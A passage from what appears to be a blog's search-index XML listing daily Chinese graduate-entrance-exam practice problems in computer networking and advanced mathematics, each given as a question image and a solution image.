<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/15-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/12/%E8%AE%A1%E7%BD%91/15-2.jpg" class>]]></content>
      <categories>
        <category>每日一题考研题</category>
        <category>计网</category>
      </categories>
  </entry>
  <entry>
    <title>每日一题考研题——高数(持续更新)</title>
    <url>/2024/05/14/%E9%AB%98%E6%95%B0/</url>
    <content><![CDATA[<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/1-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/1-2.jpg" class>

<span id="more"></span>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/2-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/2-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/3-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/3-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/4-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/4-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/5-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/5-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/6-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/6-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/7-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/7-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/8-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/8-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/9-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/9-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/10-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/10-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/11-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/11-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/12-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/12-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/13-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/13-2.jpg" class>

<h2><span id></span></h2><h3><span id="题目">题目</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/14-1.jpg" class>

<h3><span id="解题思路">解题思路</span></h3><img data-src="/2024/05/14/%E9%AB%98%E6%95%B0/14-2.jpg" class>
]]></content>
      <categories>
        <category>每日一题考研题</category>
        <category>高数</category>
      </categories>
  </entry>
</search>
